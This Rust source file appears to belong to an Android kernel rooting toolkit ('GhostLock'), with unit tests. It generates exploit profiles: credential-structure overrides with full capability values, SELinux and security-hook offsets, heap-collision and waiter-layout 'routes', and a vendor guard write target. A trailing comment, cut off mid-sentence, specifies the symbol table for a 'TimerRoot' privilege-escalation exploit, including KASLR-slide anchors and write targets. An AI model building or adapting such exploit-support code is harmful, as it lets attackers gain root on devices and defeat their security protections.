//! Output rendering for extracted kernel metadata.

use serde_json::{Value, json};
use std::collections::BTreeMap;

use crate::derive::Cred5x;
use crate::error::{ExtractError, Result};
use crate::symbols::{OPTIONAL_SYMBOLS, kernel_layout_verified};

pub fn pselect_waiter_shift_for(release: Option<&str>) -> Option<i64> {
    if !kernel_layout_verified(release) {
        return None;
    }
    match crate::symbols::kernel_struct_macro(release) {
        Some("STRUCT_OFFSETS_6_12") => Some(0),
        // android14-6.1 compiles its fd_set words one qword later than
        // 6.6; the committed tables all measure 1.
        Some("STRUCT_OFFSETS_6_1") => Some(1),
        Some("STRUCT_OFFSETS_6_6") => Some(-2),
        _ => None,
    }
}

pub fn build_report(
    release: Option<&str>,
    base: u64,
    phys: Option<u64>,
    symbols: &BTreeMap<String, Option<u64>>,
    structs: &BTreeMap<String, Option<u32>>,
    btf_size: usize,
    pselect_shift: Option<i64>,
) -> Value {
    let symbol_json: BTreeMap<String, Value> = symbols
        .iter()
        .map(|(key, value)| {
            (
                key.clone(),
                match value {
                    Some(v) => json!(v),
                    None => Value::Null,
                },
            )
        })
        .collect();
    let struct_json: BTreeMap<String, Value> = structs
        .iter()
        .map(|(key, value)| {
            (
                key.clone(),
                match value {
                    Some(v) => json!(v),
                    None => Value::Null,
                },
            )
        })
        .collect();
    let mut report = json!({
        "release": release,
        "kimage_text_base": base,
        "kernel_phys_load": phys,
        "pselect_waiter_shift": pselect_shift,
        "symbols": symbol_json,
        "struct_fields": struct_json,
        "btf_size": btf_size,
    });
    if kernel_layout_verified(release)
        && crate::symbols::kernel_struct_macro(release) == Some("STRUCT_OFFSETS_6_1")
    {
        // 0x400 is the device SLUB stride, not the BTF 0x3c0
        report["compact_waiter"] = json!(1);
        report["mm_struct_sz"] = json!(0x400);
    }
    report
}

/// `task_struct` keys in the bundled profiles' order.
const CONF_TASK_FIELDS: &[(&str, &str)] = &[
    ("task_prio", "prio"),
    ("task_normal_prio", "normal_prio"),
    ("task_sched_task_group", "sched_task_group"),
    ("task_pi_lock", "pi_lock"),
    ("task_pi_waiters", "pi_waiters"),
    ("task_pi_top_task", "pi_top_task"),
    ("task_pi_blocked_on", "pi_blocked_on"),
    ("task_pid", "pid"),
    ("task_tgid", "tgid"),
    ("task_atomic_flags", "atomic_flags"),
    ("task_real_cred", "real_cred"),
    ("task_cred", "cred"),
    ("task_comm", "comm"),
    ("task_tasks", "tasks"),
    ("task_seccomp", "seccomp"),
];

/// Full route field universe per branch (authoritative: Kotlin
/// `RouteConfig.entries()` / native `kSections`). A missing value renders as
/// `null` so every generated profile carries every field of its route.
const CONF_ROUTE_FIELDS: &[(&str, &[&str])] = &[
    ("tcp_zerocopy", &["compact_waiter"]),
    ("select_stack", &["waiter_shift"]),
    (
        "multicast_waiter",
        &[
            "waiter_off",
            "buffer_size",
            "task_offset",
            "lock_offset",
            "compact_waiter",
        ],
    ),
];

/// Full credential field universe (native `kCred` / `credential-6x.conf`).
const CONF_CRED_FIELDS: &[&str] = &[
    "copy_size",
    "usage_offset",
    "usage_value",
    "caps_offset",
    "caps_count",
    "caps_value",
    "ref_count",
    "ref0_offset",
    "ref1_offset",
    "ref2_offset",
    "ref3_offset",
    "ref0_image",
    "ref1_image",
    "ref2_image",
    "ref3_image",
];

/// Full offset field universe (native `kOffset`).
const CONF_OFFSET_FIELDS: &[&str] = &[
    "init_task",
    "init_cred",
    "empty_zero_page",
    "root_task_group",
    "selinux_enforcing",
    "selinux_blob_sizes",
    "security_hook_heads",
    "slide_nfulnl_logger",
    "slide_loggers_0_1",
    "slide_boot_id",
];

/// Looks up a key in `(key, value)` entries, or `"null"` when absent.
fn conf_lookup(entries: &[(String, String)], key: &str) -> String {
    entries
        .iter()
        .find(|(candidate, _)| candidate == key)
        .map(|(_, value)| value.clone())
        .unwrap_or_else(|| "null".to_string())
}

/// Extra `offset.*` keys the extractor resolves outside the `off_*` symbol
/// table (kallsyms-only symbols). Kept in its bundled-profile position.
#[derive(Debug, Clone, Default)]
pub struct ConfExtraOffsets {
    pub empty_zero_page: Option<u64>,
    /// offsetof(struct tracepoint, funcs) from this image's BTF (vr.ko
    /// W1c composition). 6.6 moved the field behind probestub (+0x48);
    /// on 6.1 it stays at +0x40.
    pub vr_tracepoint_funcs: Option<u32>,
}

/// The shared 6.x credential template (`credential-6x.conf`), in the bundled
/// order. The flatten rule inlines it instead of an include line; the values
/// stay pinned to that asset by `BuiltinProfilesTest`.
pub fn conf_cred_6x() -> Vec<(String, String)> {
    [
        ("caps_offset", 48),
        ("copy_size", 136),
        ("usage_value", 1),
        ("caps_count", 5),
        ("caps_value", -1),
    ]
    .into_iter()
    .map(|(key, value)| (key.to_string(), value.to_string()))
    .collect()
}

/// The 5.x credential template from the derived `init_cred` values, in the
/// bundled profile order. Reference images are pre-KASLR kernel VAs rendered
/// as signed decimals (the profile's spelling).
pub fn conf_cred_5x(cred: &Cred5x, copy_size: u32) -> Vec<(String, String)> {
    let mut entries: Vec<(String, String)> = vec![
        ("caps_offset".to_string(), cred.caps_offset.to_string()),
        ("copy_size".to_string(), copy_size.to_string()),
        (
            "usage_value".to_string(),
            crate::derive::CRED_5X_USAGE_VALUE.to_string(),
        ),
        ("caps_count".to_string(), cred.caps_count.to_string()),
        ("caps_value".to_string(), cred.caps_value.to_string()),
    ];
    for (index, (offset, _)) in cred.refs.iter().enumerate() {
        entries.push((format!("ref{index}_offset"), offset.to_string()));
    }
    entries.push(("ref_count".to_string(), cred.refs.len().to_string()));
    for (index, (_, image)) in cred.refs.iter().enumerate() {
        entries.push((format!("ref{index}_image"), (*image as i64).to_string()));
    }
    entries
}

/// The selected route's branch geometry, or an empty list when the extractor
/// cannot derive a layout for it (the built-in profile then supplies it).
pub fn conf_route_geometry(
    route: &str,
    release: &str,
    pselect_shift: Option<i64>,
    structs: &BTreeMap<String, Option<u32>>,
) -> Vec<(&'static str, i64)> {
    let major = release
        .split('.')
        .next()
        .and_then(|part| part.parse::<u32>().ok());
    match route {
        "select_stack" => pselect_shift
            .map(|shift| vec![("waiter_shift", shift)])
            .unwrap_or_default(),
        // android14-6.1 is the compact-waiter family; no other family has a
        // measured tcp layout.
        "tcp_zerocopy"
            if kernel_layout_verified(Some(release))
                && crate::symbols::kernel_struct_macro(Some(release))
                    == Some("STRUCT_OFFSETS_6_1") =>
        {
            vec![("compact_waiter", 1)]
        }
        // The 5.x one-shot multicast branch runs entirely from probe-derived
        // constants (waiter_off / buffer_size), BTF-derived rt_mutex_waiter
        // task/lock offsets and the fixed 5.x waiter-layout flag. Emit all of
        // them for every 5.x kernel so the generated profile runs without
        // manual edits; a kernel without BTF omits only the task/lock keys.
        "multicast_waiter" if major == Some(5) => {
            crate::derive::multicast_geometry_corroborated(structs)
        }
        _ => Vec::new(),
    }
}

/// `offset` keys in the bundled profiles' order; `empty_zero_page` comes from
/// kallsyms instead of an `off_*` symbol.
fn conf_offsets(
    symbols: &BTreeMap<String, Option<u64>>,
    extra: &ConfExtraOffsets,
) -> Vec<(String, String)> {
    let symbol = |key: &str| {
        symbols
            .get(key)
            .copied()
            .flatten()
            .map(|value| value.to_string())
    };
    [
        ("init_task", symbol("off_init_task")),
        ("init_cred", symbol("off_init_cred")),
        (
            "empty_zero_page",
            extra.empty_zero_page.map(|v| v.to_string()),
        ),
        ("root_task_group", symbol("off_root_task_group")),
        ("selinux_enforcing", symbol("off_selinux_enforcing")),
        ("selinux_blob_sizes", symbol("off_selinux_blob_sizes")),
        ("security_hook_heads", symbol("off_security_hook_heads")),
        ("slide_nfulnl_logger", symbol("off_slide_nfulnl_logger")),
        ("slide_boot_id", symbol("off_slide_boot_id")),
        ("slide_loggers_0_1", symbol("off_slide_loggers_0_1")),
        ("vr_sys_exit_tp", symbol("off_vr_sys_exit_tp")),
        ("vr_tag_a", symbol("off_vr_tag_a")),
        ("vr_tag_b", symbol("off_vr_tag_b")),
    ]
    .into_iter()
    .filter_map(|(key, value)| value.map(|value| (key.to_string(), value)))
    .collect()
}

fn push_conf_block(lines: &mut Vec<String>, name: &str, entries: &[(String, String)]) {
    if entries.is_empty() {
        return;
    }
    lines.push(format!("{name} {{"));
    for (key, value) in entries {
        lines.push(format!("  {key} = {value}"));
    }
    lines.push("}".to_string());
}

/// Everything `render_conf` writes, in one bundle.
#[derive(Debug, Clone)]
pub struct ConfInputs<'a> {
    pub release: &'a str,
    pub phys: Option<u64>,
    /// DRAM base (linear-map PHYS_OFFSET); normally supplied by hand, so the
    /// extractor writes an explicit `null` unless one is known.
    pub phys_offset: Option<u64>,
    pub symbols: &'a BTreeMap<String, Option<u64>>,
    pub structs: &'a BTreeMap<String, Option<u32>>,
    pub route: Option<&'a str>,
    pub route_geometry: &'a [(&'static str, i64)],
    pub cred: &'a [(String, String)],
    pub extra_offsets: &'a ConfExtraOffsets,
}

/// Renders a flattened, self-contained GLK profile (`--format conf`): no
/// `include` lines, the shared 6.x credential and KernelSnitch constants
/// inlined, keys and nesting matching `app/src/main/assets/kernel_profiles/`.
/// Fields without a derived value are omitted rather than written as `null`.
pub fn render_conf(input: &ConfInputs<'_>) -> String {
    let release = input.release;
    let major = release
        .split('.')
        .next()
        .and_then(|part| part.parse::<u32>().ok());
    let mut lines = vec![
        format!("# GhostLock kernel profile: {release} (HOCON, self-contained)."),
        format!("release = \"{release}\""),
        "schema_version = 1".to_string(),
        format!("kernel_major = {}", major.unwrap_or(0)),
        "recommend_shizuku = 0".to_string(),
    ];
    lines.push(match input.phys {
        // Decimal only: HOCON has no `0x` literal, and the Kotlin reader
        // (`getLongAt`) accepts a Number only, so a hex spelling would be
        // silently dropped on import. An unknown phys is an explicit `null`.
        Some(phys) => format!("kernel_phys_load = {phys}"),
        None => "kernel_phys_load = null".to_string(),
    });
    lines.push(match input.phys_offset {
        Some(offset) => format!("kernel_phys_offset = {offset}"),
        None => "kernel_phys_offset = null".to_string(),
    });
    if let Some(route) = input.route {
        // The chosen route keeps its whole field universe even when no
        // geometry could be derived, so the import carries the recommendation
        // and the missing fields surface as invalid paths on the Kotlin side.
        lines.push("route {".to_string());
        lines.push(format!("  {route} {{"));
        match CONF_ROUTE_FIELDS.iter().find(|(name, _)| *name == route) {
            Some((_, fields)) => {
                for field in *fields {
                    let value = input
                        .route_geometry
                        .iter()
                        .find(|(key, _)| key == field)
                        .map(|(_, value)| value.to_string())
                        .unwrap_or_else(|| "null".to_string());
                    lines.push(format!("    {field} = {value}"));
                }
            }
            None => {
                for (key, value) in input.route_geometry {
                    lines.push(format!("    {key} = {value}"));
                }
            }
        }
        lines.push("  }".to_string());
        lines.push("}".to_string());
    }
    push_conf_block(
        &mut lines,
        "fallback",
        &[("to".to_string(), "\"none\"".to_string())],
    );

    // KernelSnitch: full universe. `collisions` is emitted for a verified
    // train (and every 5.x kernel); `mm_struct_sz` only where it applies. An
    // unverified release keeps both as `null` rather than omitting the block.
    let mut snitch = Vec::new();
    if kernel_layout_verified(Some(release)) || major == Some(5) {
        match major {
            Some(6) => {
                // = kernelsnitch-6x.conf
                snitch.push(("collisions".to_string(), "4".to_string()));
                if crate::symbols::kernel_struct_macro(Some(release)) == Some("STRUCT_OFFSETS_6_1")
                {
                    // 0x400 is the device SLUB stride, not the BTF sizeof (0x3c0).
                    snitch.push(("mm_struct_sz".to_string(), "1024".to_string()));
                }
            }
            Some(5) => {
                // android13-5.15 measured defaults (bundled 5.15 profile).
                snitch.push(("collisions".to_string(), "8".to_string()));
                snitch.push(("mm_struct_sz".to_string(), "1024".to_string()));
            }
            _ => {}
        }
    }
    push_conf_block(
        &mut lines,
        "kernelsnitch",
        &[
            ("collisions".to_string(), conf_lookup(&snitch, "collisions")),
            (
                "mm_struct_sz".to_string(),
                conf_lookup(&snitch, "mm_struct_sz"),
            ),
        ],
    );

    let task: Vec<(String, String)> = CONF_TASK_FIELDS
        .iter()
        .map(|(macro_name, key)| {
            (
                (*key).to_string(),
                input
                    .structs
                    .get(*macro_name)
                    .copied()
                    .flatten()
                    .map(|value| value.to_string())
                    .unwrap_or_else(|| "null".to_string()),
            )
        })
        .collect();
    push_conf_block(&mut lines, "task_struct", &task);

    let cred: Vec<(String, String)> = CONF_CRED_FIELDS
        .iter()
        .map(|key| ((*key).to_string(), conf_lookup(input.cred, key)))
        .collect();
    push_conf_block(&mut lines, "cred", &cred);

    let offset_entries = conf_offsets(input.symbols, input.extra_offsets);
    let mut offset: Vec<(String, String)> = CONF_OFFSET_FIELDS
        .iter()
        .map(|key| ((*key).to_string(), conf_lookup(&offset_entries, key)))
        .collect();
    // vr.ko guard fields: only when the image (or the vendor_boot probe)
    // actually yielded them. A device without vivo's vr.ko must not carry
    // placeholder zeros into its profile.
    for (field, key) in [
        ("vr_sys_exit_tp", "off_vr_sys_exit_tp"),
        ("vr_tag_a", "off_vr_tag_a"),
        ("vr_tag_b", "off_vr_tag_b"),
    ] {
        if let Some(value) = input
            .symbols
            .get(key)
            .copied()
            .flatten()
            .map(|v| v.to_string())
        {
            offset.push((field.to_string(), value));
        }
    }
    push_conf_block(&mut lines, "offset", &offset);

    // vr.ko guard composition: the W1c target is offset.vr_sys_exit_tp +
    // vr_guard.tracepoint_funcs. The block is only written when the image
    // actually yielded the tracepoint symbol (vivo devices); absent vr.ko
    // data leaves both stages to the per-task tag clear only.
    if input.symbols.get("off_vr_sys_exit_tp").copied().flatten().is_some() {
        push_conf_block(
            &mut lines,
            "vr_guard",
            &[match input.extra_offsets.vr_tracepoint_funcs {
                Some(funcs) => ("tracepoint_funcs".to_string(), funcs.to_string()),
                None => ("tracepoint_funcs".to_string(), "null".to_string()),
            }],
        );
    }

    lines.join("\n") + "\n"
}

pub fn require_fields(
    values: &BTreeMap<String, Option<u64>>,
    optional: &BTreeSet<&str>,
) -> Result<()> {
    let missing: Vec<String> = values
        .iter()
        .filter(|(name, value)| value.is_none() && !optional.contains(name.as_str()))
        .map(|(name, _)| name.clone())
        .collect();
    if !missing.is_empty() {
        return Err(ExtractError::unsupported(format!(
            "missing required values: {}",
            missing.join(", ")
        )));
    }
    Ok(())
}

use std::collections::BTreeSet;

pub fn optional_symbols() -> BTreeSet<&'static str> {
    OPTIONAL_SYMBOLS.iter().copied().collect()
}

/// BTF struct fields a kernel may legitimately lack: the 5.15 GKI BTF has no
/// `slab` type, so `struct_slab_cache` is missing there. Reported as missing,
/// but not failing the extract.
const OPTIONAL_STRUCT_FIELDS: &[&str] = &["struct_slab_cache"];

pub fn optional_struct_fields() -> BTreeSet<&'static str> {
    OPTIONAL_STRUCT_FIELDS.iter().copied().collect()
}

#[cfg(test)]
mod tests {
    use super::{
        CONF_TASK_FIELDS, ConfExtraOffsets, ConfInputs, build_report, conf_cred_5x, conf_cred_6x,
        conf_route_geometry, pselect_waiter_shift_for, render_conf,
    };
    use crate::derive::Cred5x;
    use std::collections::BTreeMap;

    fn conf_fixture() -> (BTreeMap<String, Option<u64>>, BTreeMap<String, Option<u32>>) {
        let mut symbols: BTreeMap<String, Option<u64>> = BTreeMap::new();
        symbols.insert("off_init_task".to_string(), Some(34_595_456));
        symbols.insert("off_security_hook_heads".to_string(), Some(0));
        symbols.insert("off_absent".to_string(), None);
        let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
        structs.insert("task_prio".to_string(), Some(132));
        structs.insert("waiter_task".to_string(), Some(48));
        structs.insert("waiter_lock".to_string(), Some(56));
        (symbols, structs)
    }

    fn no_extra_offsets() -> ConfExtraOffsets {
        ConfExtraOffsets::default()
    }

    #[test]
    fn conf_is_flattened_and_inlines_the_6x_shared_constants() {
        let (symbols, structs) = conf_fixture();
        let geometry: Vec<(&'static str, i64)> = vec![("waiter_shift", -2)];
        let out = render_conf(&ConfInputs {
            release: "6.6.89-android15-8-g0889fe95bb10-ab14402178-4k",
            phys: Some(0x4000_0000),
            phys_offset: None,
            symbols: &symbols,
            structs: &structs,
            route: Some("select_stack"),
            route_geometry: &geometry,
            cred: &conf_cred_6x(),
            extra_offsets: &no_extra_offsets(),
        });
        assert!(!out.contains("include"));
        assert!(out.contains("kernel_phys_load = 1073741824"));
        assert!(out.contains("route {\n  select_stack {\n    waiter_shift = -2\n  }\n}"));
        assert!(out.contains("collisions = 4"));
        assert!(out.contains("mm_struct_sz = null"));
        assert!(!out.contains("task_prio"));
        assert!(out.contains("  prio = 132"));
        assert!(out.contains("cred {"));
        assert!(out.contains("copy_size = 136"));
        assert!(out.contains("caps_offset = 48"));
        assert!(out.contains("caps_value = -1"));
        assert!(out.contains("init_task = 34595456"));
        assert!(out.contains("security_hook_heads = 0"));
        assert!(!out.contains("off_absent"));
    }

    #[test]
    fn conf_61_writes_the_compact_waiter_and_slub_stride() {
        let (symbols, structs) = conf_fixture();
        let geometry: Vec<(&'static str, i64)> = vec![("compact_waiter", 1)];
        let out = render_conf(&ConfInputs {
            release: "6.1.118-android14-11-gca0ef6d17716-ab13624819",
            phys: None,
            phys_offset: None,
            symbols: &symbols,
            structs: &structs,
            route: Some("tcp_zerocopy"),
            route_geometry: &geometry,
            cred: &conf_cred_6x(),
            extra_offsets: &no_extra_offsets(),
        });
        assert!(out.contains("tcp_zerocopy {\n    compact_waiter = 1"));
        assert!(out.contains("mm_struct_sz = 1024"));
        assert!(out.contains("kernel_phys_load = null"));
    }

    #[test]
    fn conf_5x_carries_the_derived_credential_and_multicast_geometry() {
        let (symbols, structs) = conf_fixture();
        let cred = Cred5x {
            caps_offset: 48,
            caps_count: 3,
            caps_value: 0x1ffffffffff,
            refs: vec![
                (0x80, 0xffffffc00ab23a80),
                (0x88, 0xffffffc00acce110),
                (0x90, 0xffffffc00ab23ff0),
                (0x98, 0xffffffc00ab23b28),
            ],
        };
        let geometry = conf_route_geometry(
            "multicast_waiter",
            "5.15.189-android13-8-00016-g51bba4309aac-ab14546557",
            Some(-2),
            &structs,
        );
        let out = render_conf(&ConfInputs {
            release: "5.15.189-android13-8-00016-g51bba4309aac-ab14546557",
            phys: None,
            phys_offset: None,
            symbols: &symbols,
            structs: &structs,
            route: Some("multicast_waiter"),
            route_geometry: &geometry,
            cred: &conf_cred_5x(&cred, 176),
            extra_offsets: &ConfExtraOffsets {
                empty_zero_page: Some(47_529_984),
                vr_tracepoint_funcs: None,
            },
        });
        assert!(out.contains("multicast_waiter {\n    waiter_off = 96"));
        assert!(out.contains("buffer_size = 264"));
        assert!(out.contains("task_offset = 48"));
        assert!(out.contains("lock_offset = 56"));
        assert!(out.contains("compact_waiter = 1"));
        assert!(out.contains("collisions = 8"));
        assert!(out.contains("mm_struct_sz = 1024"));
        assert!(out.contains("cred {"));
        assert!(out.contains("copy_size = 176"));
        assert!(out.contains("usage_value = 256"));
        assert!(out.contains("caps_count = 3"));
        assert!(out.contains("caps_value = 2199023255551"));
        assert!(out.contains("ref0_offset = 128"));
        assert!(out.contains("ref3_offset = 152"));
        assert!(out.contains("ref_count = 4"));
        assert!(out.contains("ref0_image = -274698454400"));
        assert!(out.contains("ref3_image = -274698454232"));
        assert!(out.contains("empty_zero_page = 47529984"));
    }

    #[test]
    fn conf_route_geometry_follows_the_measured_families() {
        let (_, structs) = conf_fixture();
        assert_eq!(
            conf_route_geometry("select_stack", "6.6.89-android15-8", Some(-2), &structs),
            vec![("waiter_shift", -2)]
        );
        assert!(
            conf_route_geometry("select_stack", "6.6.89-android15-8", None, &structs).is_empty()
        );
        assert_eq!(
            conf_route_geometry("tcp_zerocopy", "6.1.118-android14-11", Some(1), &structs),
            vec![("compact_waiter", 1)]
        );
        assert!(
            conf_route_geometry("tcp_zerocopy", "6.6.89-android15-8", Some(-2), &structs)
                .is_empty()
        );
        assert_eq!(
            conf_route_geometry(
                "multicast_waiter",
                "5.15.189-android13-8-00016-g51bba4309aac-ab14546557",
                Some(-2),
                &structs
            ),
            vec![
                ("waiter_off", 96),
                ("buffer_size", 264),
                ("task_offset", 48),
                ("lock_offset", 56),
                ("compact_waiter", 1),
            ]
        );
        assert!(
            conf_route_geometry("multicast_waiter", "6.6.89-android15-8", Some(-2), &structs)
                .is_empty()
        );
    }

    #[test]
    fn unverified_route_geometry_is_a_partial_candidate() {
        let (_, structs) = conf_fixture();
        // No image-derived shift: the route branch stays empty rather than
        // borrowing the -2 family default.
        assert!(conf_route_geometry("select_stack", "6.7.1-generic", None, &structs).is_empty());
        // An image-derived shift is kept.
        assert_eq!(
            conf_route_geometry("select_stack", "6.7.1-generic", Some(-1), &structs),
            vec![("waiter_shift", -1)]
        );
        // Every 5.x multicast profile carries the full one-shot geometry so it
        // runs without manual edits, even when the release string carries no
        // "-android13-" train tag.
        assert_eq!(
            conf_route_geometry(
                "multicast_waiter",
                "5.15.178-g3575c47dc7ce-dirty",
                Some(-2),
                &structs
            ),
            vec![
                ("waiter_off", 96),
                ("buffer_size", 264),
                ("task_offset", 48),
                ("lock_offset", 56),
                ("compact_waiter", 1),
            ]
        );
    }

    #[test]
    fn verified_5x_train_without_device_evidence_omits_measured_placement() {
        let (_, structs) = conf_fixture();
        let geometry = conf_route_geometry(
            "multicast_waiter",
            "5.15.208-android13-9-gabcdef",
            Some(-2),
            &structs,
        );
        assert!(geometry.contains(&("waiter_off", 96)));
        assert!(geometry.contains(&("buffer_size", 264)));
        assert!(geometry.contains(&("task_offset", 48)));
        assert!(geometry.contains(&("lock_offset", 56)));
        assert!(geometry.contains(&("compact_waiter", 1)));
        assert!(
            !geometry.iter().any(|(key, _)| {
                let key = *key;
                key.starts_with("fake_") || key.starts_with("lock_slot")
            }),
            "device-measured placement must not be inherited by the train"
        );
    }

    #[test]
    fn candidate_conf_keeps_the_route_branch_when_geometry_is_empty() {
        let symbols: BTreeMap<String, Option<u64>> = BTreeMap::new();
        let structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
        let out = render_conf(&ConfInputs {
            release: "5.15.178-g3575c47dc7ce-dirty",
            phys: None,
            phys_offset: None,
            symbols: &symbols,
            structs: &structs,
            route: Some("multicast_waiter"),
            route_geometry: &[],
            cred: &[],
            extra_offsets: &ConfExtraOffsets {
                empty_zero_page: None,
                vr_tracepoint_funcs: None,
            },
        });
        assert!(out.contains("route {"));
        assert!(out.contains("multicast_waiter {"));
        assert!(out.contains("release = \"5.15.178-g3575c47dc7ce-dirty\""));
    }

    #[test]
    fn unverified_release_omits_kernelsnitch_defaults() {
        let (symbols, structs) = conf_fixture();
        let out = render_conf(&ConfInputs {
            release: "6.7.1-generic",
            phys: None,
            phys_offset: None,
            symbols: &symbols,
            structs: &structs,
            route: None,
            route_geometry: &[],
            cred: &[],
            extra_offsets: &no_extra_offsets(),
        });
        assert!(out.contains("kernelsnitch {"));
        assert!(out.contains("collisions = null"));
        assert!(out.contains("mm_struct_sz = null"));
    }

    #[test]
    fn unverified_5x_candidate_is_runnable() {
        let (symbols, structs) = conf_fixture();
        let geometry = conf_route_geometry(
            "multicast_waiter",
            "5.15.178-g3575c47dc7ce-dirty",
            Some(-2),
            &structs,
        );
        let out = render_conf(&ConfInputs {
            release: "5.15.178-g3575c47dc7ce-dirty",
            phys: None,
            phys_offset: None,
            symbols: &symbols,
            structs: &structs,
            route: Some("multicast_waiter"),
            route_geometry: &geometry,
            cred: &[],
            extra_offsets: &no_extra_offsets(),
        });
        assert!(out.contains("multicast_waiter {\n    waiter_off = 96"));
        assert!(out.contains("buffer_size = 264"));
        assert!(out.contains("task_offset = 48"));
        assert!(out.contains("lock_offset = 56"));
        assert!(out.contains("compact_waiter = 1"));
        // The 5.x KernelSnitch defaults are required to run and are emitted even
        // without the "-android13-" train tag.
        assert!(out.contains("kernelsnitch"));
        assert!(out.contains("collisions = 8"));
        assert!(out.contains("mm_struct_sz = 1024"));
    }

    #[test]
    fn pselect_waiter_shift_matches_the_committed_tables() {
        assert_eq!(
            pselect_waiter_shift_for(Some("6.1.118-android14-11-gca0ef6d17716-ab13624819")),
            Some(1)
        );
        assert_eq!(
            pselect_waiter_shift_for(Some("6.6.92-android15-8")),
            Some(-2)
        );
        assert_eq!(
            pselect_waiter_shift_for(Some("6.12.30-android16-0")),
            Some(0)
        );
        assert_eq!(pselect_waiter_shift_for(Some("6.7.1-android16-1")), None);
        assert_eq!(pselect_waiter_shift_for(None), None);
    }

    #[test]
    fn json_report_keeps_unverified_pselect_shift_null() {
        let symbols = BTreeMap::new();
        let structs = BTreeMap::new();
        let report = build_report(
            Some("6.7.1-generic"),
            0,
            None,
            &symbols,
            &structs,
            0,
            pselect_waiter_shift_for(Some("6.7.1-generic")),
        );
        assert!(report["pselect_waiter_shift"].is_null());
    }

    /// Flatten a HOCON-ish profile into `section.key` -> value, ignoring
    /// comments and one level of brace nesting.
    fn flatten_conf(text: &str) -> BTreeMap<String, String> {
        let mut out = BTreeMap::new();
        let mut stack: Vec<String> = Vec::new();
        for raw in text.lines() {
            let line = raw.split('#').next().unwrap_or("").trim();
            if line.is_empty() {
                continue;
            }
            if line.ends_with('{') {
                stack.push(line[..line.len() - 1].trim().to_string());
                continue;
            }
            if line == "}" {
                stack.pop();
                continue;
            }
            if let Some((key, value)) = line.split_once('=') {
                let key = key.trim();
                let value = value.trim();
                let full = if stack.is_empty() {
                    key.to_string()
                } else {
                    format!("{}.{}", stack.join("."), key)
                };
                out.insert(full, value.to_string());
            }
        }
        out
    }

    /// The values the real extractor produces for the A301SO `5.15.189` boot
    /// image, so the rendered conf can be compared field-for-field with the
    /// bundled, hardware-validated profile.
    fn a301so_inputs() -> (
        String,
        BTreeMap<String, Option<u64>>,
        BTreeMap<String, Option<u32>>,
        Vec<(String, String)>,
        ConfExtraOffsets,
    ) {
        let release = "5.15.189-android13-8-00016-g51bba4309aac-ab14546557";
        let mut symbols: BTreeMap<String, Option<u64>> = BTreeMap::new();
        for (key, value) in [
            ("off_init_task", 46_412_800u64),
            ("off_init_cred", 46_126_472),
            ("off_root_task_group", 47_549_120),
            ("off_selinux_enforcing", 47_885_704),
            ("off_selinux_blob_sizes", 35_027_656),
            ("off_security_hook_heads", 35_018_304),
            ("off_slide_nfulnl_logger", 45_096_488),
            ("off_slide_boot_id", 47_999_001),
            ("off_slide_loggers_0_1", 45_096_280),
        ] {
            symbols.insert(key.to_string(), Some(value));
        }
        let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
        for (key, _) in CONF_TASK_FIELDS {
            // Values from the A301SO image's BTF.
            let v = match *key {
                "task_prio" => 124,
                "task_normal_prio" => 132,
                "task_sched_task_group" => 1024,
                "task_pi_lock" => 2180,
                "task_pi_waiters" => 2200,
                "task_pi_top_task" => 2216,
                "task_pi_blocked_on" => 2224,
                "task_pid" => 1496,
                "task_tgid" => 1500,
                "task_atomic_flags" => 1432,
                "task_real_cred" => 1936,
                "task_cred" => 1944,
                "task_comm" => 1960,
                "task_tasks" => 1232,
                "task_seccomp" => 2144,
                _ => continue,
            };
            structs.insert(key.to_string(), Some(v));
        }
        structs.insert("waiter_task".to_string(), Some(48));
        structs.insert("waiter_lock".to_string(), Some(56));
        let cred5x = Cred5x {
            caps_offset: 48,
            caps_count: 3,
            caps_value: 2_199_023_255_551,
            refs: vec![
                (128, -274_698_454_400i64 as u64),
                (136, -274_696_707_824i64 as u64),
                (144, -274_698_453_008i64 as u64),
                (152, -274_698_454_232i64 as u64),
            ],
        };
        let cred = conf_cred_5x(&cred5x, 176);
        let extra = ConfExtraOffsets {
            empty_zero_page: Some(47_529_984),
            vr_tracepoint_funcs: None,
        };
        (release.to_string(), symbols, structs, cred, extra)
    }

    #[test]
    fn a301so_generated_conf_matches_the_bundled_profile() {
        let (release, symbols, structs, cred, extra) = a301so_inputs();
        let geometry = conf_route_geometry("multicast_waiter", &release, None, &structs);
        let generated = render_conf(&ConfInputs {
            release: &release,
            phys: None,
            phys_offset: None,
            symbols: &symbols,
            structs: &structs,
            route: Some("multicast_waiter"),
            route_geometry: &geometry,
            cred: &cred,
            extra_offsets: &extra,
        });
        let bundled = std::fs::read_to_string(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../app/src/main/assets/kernel_profiles/5.15.189-android13-8-00016-g51bba4309aac-ab14546557.conf"
        ))
        .expect("bundled 5.15.189 profile");
        let generated = flatten_conf(&generated);
        let bundled = flatten_conf(&bundled);

        assert!(generated.contains_key("route.multicast_waiter.waiter_off"));
        // The one intentional difference: shizuku defaults to off in generated
        // confs, the bundled profile recommends it.
        assert_eq!(
            generated.get("recommend_shizuku").map(String::as_str),
            Some("0")
        );
        assert_eq!(
            bundled.get("recommend_shizuku").map(String::as_str),
            Some("1")
        );

        for key in bundled.keys() {
            if key == "recommend_shizuku" {
                continue;
            }
            assert_eq!(
                generated.get(key),
                bundled.get(key),
                "field {key} differs between generated and bundled profile"
            );
        }
        // And the generated profile carries no extra non-comment field.
        for key in generated.keys() {
            assert!(
                bundled.contains_key(key),
                "generated profile has unexpected field {key}"
            );
        }
    }
}

// ---- CVE-2026-98260 (TimerRoot) symbol table ------------------------------
//
// The t98260 exploit consumes a text table ("ic-syms") of link-time kallsyms
// addresses: voting anchors for the KASLR slide plus the write targets.
// Format contract (kzktor/ic-timer-lpe, core/ic_syms.{c,h}, GPL-3.0):
//   # ic-timer symbol table
//   # build=<uname -r>
//   name=0x<absolute link-time address>
// The last entries after `do_group_exit` are the targets/extras; the four
// targets are hard requirements, everything else degrades on the exploit
// side when absent.
//
// The extended format appends a geometry block so one generic binary can run
// against any kernel whose table was parsed from its image (the compiled
// profile is only a fallback):
//   # geometry (BTF-derived; consumed by the TimerRoot core)
//   off.<name>=0x<value>
// The essential key set mirrors ic_geo_keys[] in
// third_party/timerroot/ic_syms.c (IC_GEOM_ESSENTIAL = 16).

/// ic-timer's required symbol set, in `ic_syms_required[]` order: voting
/// anchors first, then the four targets (`__tracepoint_sys_exit`,
